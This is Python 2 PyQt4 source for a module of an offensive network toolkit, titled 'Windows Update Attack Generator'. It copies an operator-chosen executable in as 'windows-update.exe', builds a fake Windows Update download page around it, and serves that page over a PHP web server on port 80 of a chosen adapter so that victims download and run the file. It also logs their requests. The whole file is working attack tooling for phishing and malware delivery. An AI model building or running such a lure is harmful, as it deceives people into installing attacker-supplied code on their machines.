#The MIT License (MIT)
#Copyright (c) 2015-2016 mh4x0f P0cL4bs Team
#Permission is hereby granted, free of charge, to any person obtaining a copy of
#this software and associated documentation files (the "Software"), to deal in
#the Software without restriction, including without limitation the rights to
#use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
#the Software, and to permit persons to whom the Software is furnished to do so,
#subject to the following conditions:
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
#FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
#COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
#IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
#CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
from PyQt4.QtGui import *
from PyQt4.QtCore import *
from os import getcwd,popen,chdir,walk,path,remove,stat,getuid
from Modules.ModuleStarvation import frm_dhcp_Attack
from Modules.utils import Refactor
from Core.Settings import frm_Settings
from re import search
from shutil import copyfile
from subprocess import Popen,PIPE,STDOUT
threadloading = {'server':[]}

class mThreadServer(QThread):
    def __init__(self,cmd):
        QThread.__init__(self)
        self.cmd = cmd
        self.process = None

    def run(self):
        popen("service apache2 stop")
        print "Starting Thread:" + self.objectName()
        self.process = p = Popen(self.cmd,
        stdout=PIPE,
            stderr=STDOUT)
        for line,data in enumerate(iter(p.stdout.readline, b'')):
            self.emit(SIGNAL("Activated( QString )"),data.rstrip())

    def stop(self):
        print "Stop thread:" + self.objectName()
        if self.process is not None:
            self.process.terminate()
            self.process = None

class frm_update_attack(QMainWindow):
    def __init__(self, parent=None):
        super(frm_update_attack, self).__init__(parent)
        self.form_widget = frm_WinSoftUp(self)
        self.setCentralWidget(self.form_widget)
        self.setWindowTitle("Windows Update Attack Generator ")
        self.setWindowIcon(QIcon('rsc/icon.ico'))
        self.config = frm_Settings()
        self.loadtheme(self.config.XmlThemeSelected())

    def loadtheme(self,theme):
        sshFile=("Core/%s.qss"%(theme))
        with open(sshFile,"r") as fh:
            self.setStyleSheet(fh.read())

    def closeEvent(self, event):
        reply = QMessageBox.question(self, 'About Exit',"Are you sure to quit?", QMessageBox.Yes |
            QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            event.accept()
            global threadloading
            for i in threadloading['server']:
                i.stop()
        else:
            event.ignore()

class frm_WinSoftUp(QWidget):
    def __init__(self, parent=None):
        super(frm_WinSoftUp, self).__init__(parent)
        self.Main = QVBoxLayout()
        self.control = None
        self.path_file = None
        self.owd = getcwd()
        global threadloading
        self.GUI()
    def GUI(self):
        self.form = QFormLayout(self)
        self.grid = QGridLayout(self)
        self.grid1 = QGridLayout(self)
        self.path = QLineEdit(self)
        self.logBox = QListWidget(self)
        self.path.setFixedWidth(400)
        self.status  = QStatusBar(self)
        self.status.setFixedHeight(15)
        #combobox
        self.cb_interface = QComboBox(self)
        self.refresh_interface(self.cb_interface)

        #label
        self.lb_interface = QLabel("Network Adapter:")
        # buttons
        self.btn_open = QPushButton("...")
        self.btn_stop = QPushButton("Stop",self)
        self.btn_reload = QPushButton("refresh",self)
        self.btn_start_server = QPushButton("Start Server",self)
        # size
        self.btn_open.setMaximumWidth(90)
        self.btn_stop.setFixedHeight(50)
        self.btn_start_server.setFixedHeight(50)
        #icons
        self.btn_open.setIcon(QIcon("rsc/open.png"))
        self.btn_stop.setIcon(QIcon("rsc/Stop.png"))
        self.btn_reload.setIcon(QIcon("rsc/refresh.png"))
        self.btn_start_server.setIcon(QIcon("rsc/server.png"))

        # connect buttons
        self.btn_open.clicked.connect(self.getpath)
        self.btn_reload.clicked.connect(self.inter_get)
        self.btn_start_server.clicked.connect(self.server_start)
        self.btn_stop.clicked.connect(self.stop_attack)


        # radionButton
        self.rb_windows = QRadioButton("Windows Update",self)
        self.rb_windows.setIcon(QIcon("rsc/winUp.png"))
        self.rb_adobe = QRadioButton("Adobe Update", self)
        self.rb_adobe.setIcon(QIcon("rsc/adobe.png"))
        self.rb_adobe.setEnabled(False)
        self.rb_java = QRadioButton("Java Update", self)
        self.rb_java.setEnabled(False)
        self.rb_java.setIcon(QIcon("rsc/java.png"))
        self.grid.addWidget(self.rb_windows, 0,1)
        self.grid.addWidget(self.rb_adobe, 0,2)
        self.grid.addWidget(self.rb_java, 0,3)

        # check interface
        self.grid.addWidget(self.lb_interface,1,1)
        self.grid.addWidget(self.cb_interface,1,2)
        self.grid.addWidget(self.btn_reload, 1,3)

        #grid 2
        self.grid1.addWidget(self.btn_start_server,0,2)
        self.grid1.addWidget(self.btn_stop,0,4)

        #form add layout
        self.form.addRow(self.path,self.btn_open)
        self.form.addRow(self.grid)
        self.form.addRow(self.grid1)
        self.form.addRow(self.logBox)
        self.form.addRow(self.status)
        self.Main.addLayout(self.form)
        self.setLayout(self.Main)

    def stop_attack(self):
        for i in threadloading['server']:i.stop()
        threadloading['server'] = []
        if path.isfile("Modules/Templates/Windows_Update/index.html"):
            remove("Modules/Templates/Windows_Update/index.html")
        if path.isfile("Modules/Templates/Windows_Update/windows-update.exe"):
            remove("Modules/Templates/Windows_Update/windows-update.exe")
        QMessageBox.information(self,"Clear Setting", "log cLear success ")
        self.logBox.clear()
        self.status.showMessage("")

    def inter_get(self):
        self.refresh_interface(self.cb_interface)

    def refresh_interface(self,cb):
        cb.clear()
        n = Refactor.get_interfaces()['all']
        for i,j in enumerate(n):
            if n[i] != "":
                cb.addItem(n[i])

    def logPhising(self,log):
        self.logBox.addItem(log)

    def server_start(self):
        if len(self.path.text()) <= 0:
            QMessageBox.information(self, "Path file Error", "Error in get the file path.")
        else:
            if self.rb_windows.isChecked():
                directory = "Modules/Templates/Windows_Update/"
                try:
                    if path.isfile(directory+"windows-update.exe"):
                        remove(directory+"windows-update.exe")
                    copyfile(self.path_file,directory+"windows-update.exe")
                except OSError,e:
                    print e
                if not getuid() != 0:
                    file_html = open("Modules/Templates/Settings_WinUpdate.html","r").read()
                    settings_html = file_html.replace("KBlenfile", str(self.getSize(self.path_file))+"KB")
                    if path.isfile(directory+"index.html"):
                        remove(directory+"index.html")
                    confFile = open(directory+"index.html","w")
                    confFile.write(settings_html)
                    confFile.close()
                    self.threadServer(directory)
                else:
                    QMessageBox.information(self, "Permission Denied", 'the Tool must be run as root try again.')
                    self.logBox.clear()
                    if path.isfile(directory+"windows-update.exe"):
                        remove(directory+"windows-update.exe")

    def threadServer(self,directory):
        ip = Refactor.get_ip_local(self.cb_interface.currentText())
        try:
            chdir(directory)
        except OSError:
            pass
        global threadloading
        self.thphp = mThreadServer(("php -S %s:80"%(ip)).split())
        self.connect(self.thphp,SIGNAL("Activated ( QString ) "),self.logPhising)
        threadloading['server'].append(self.thphp)
        self.thphp.setObjectName("Server-PHP")
        self.thphp.start()
        self.status.showMessage("::Started >> [HTTP::"+ip+" ::Port 80]")

    def getpath(self):
        files_types = "exe (*.exe);;jar (*.jar)"
        file = QFileDialog.getOpenFileName(self, 'Open Executable file','',files_types)
        if len(file) > 0:
            self.path_file = file
            self.path.setText(file)

    def getSize(self,filename):
        st = stat(filename)
        return st.st_size